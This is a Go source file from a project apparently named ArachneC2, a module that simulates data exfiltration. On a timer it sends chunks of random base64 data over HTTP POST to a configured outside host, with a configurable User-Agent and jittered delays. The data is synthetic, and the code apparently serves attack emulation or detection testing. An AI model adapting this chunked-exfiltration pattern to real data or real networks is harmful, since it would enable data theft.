// internal/exfil/exfil.go
// ArachneC2 — Data exfiltration simulation
package exfil

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/randv2"
	mrand "math/rand"
	"net/http"
	"time"

	"github.com/Lollobar17/arachne-c2/internal/config"
)

type ExfilEvent struct {
	Timestamp   string `json:"timestamp"`
	NodeID      string `json:"node_id"`
	EventType   string `json:"event_type"`
	TargetIP    string `json:"target_ip"`
	ChunkSizeKB int    `json:"chunk_size_kb"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Protocol    string `json:"protocol"`
	Success     bool   `json:"success"`
	Mimetype    string `json:"mimetype"`
}

type Exfiltrator struct {
	cfg    *config.Config
	client *http.Client
	logger EventLogger
}

type EventLogger func(event ExfilEvent)

func New(cfg *config.Config, logger EventLogger) *Exfiltrator {
	return &Exfiltrator{
		cfg:    cfg,
		client: &http.Client{Timeout: 10 * time.Second},
		logger: logger,
	}
}

func (e *Exfiltrator) Start(ctx context.Context) {
	if !e.cfg.ExfilEnabled {
		return
	}
	ticker := time.NewTicker(e.cfg.ExfilInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			e.simulateExfil()
		}
	}
}

func (e *Exfiltrator) simulateExfil() {
	// Simulate exfiltrating a "document" in chunks
	totalChunks := 3 + mrand.Intn(5)
	mimetypes := []string{"application/octet-stream", "image/jpeg", "text/plain", "application/zip"}
	mimetype := mimetypes[mrand.Intn(len(mimetypes))]

	for i := 0; i < totalChunks; i++ {
		// Generate random chunk data (simulated)
		chunkData := make([]byte, e.cfg.ExfilChunkKB*1024)
		rand.Read(chunkData)
		encoded := base64.StdEncoding.EncodeToString(chunkData)

		event := ExfilEvent{
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			NodeID:      e.cfg.NodeID,
			EventType:   "data_exfiltration",
			TargetIP:    e.cfg.ExfilTarget,
			ChunkSizeKB: e.cfg.ExfilChunkKB,
			ChunkIndex:  i + 1,
			TotalChunks: totalChunks,
			Protocol:    "HTTP",
			Success:     false,
			Mimetype:    mimetype,
		}

		// Send chunk to target (simulated — will fail in sandbox, that's expected)
		url := fmt.Sprintf("http://%s/upload", e.cfg.ExfilTarget)
		payload := map[string]interface{}{
			"node_id":     e.cfg.NodeID,
			"chunk_index": i,
			"total":       totalChunks,
			"data":        encoded[:min(len(encoded), 100)], // truncate for log safety
			"mimetype":    mimetype,
		}
		data, _ := json.Marshal(payload)

		req, err := http.NewRequest("POST", url, bytes.NewReader(data))
		if err == nil {
			req.Header.Set("User-Agent", e.cfg.UserAgent)
			req.Header.Set("Content-Type", "application/octet-stream")
			resp, err := e.client.Do(req)
			if err == nil {
				event.Success = resp.StatusCode == 200
				resp.Body.Close()
			}
		}

		e.logger(event)

		// Small delay between chunks
		time.Sleep(time.Duration(500+mrand.Intn(1000)) * time.Millisecond)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Suppress unused import
var _ = randv2.IntN
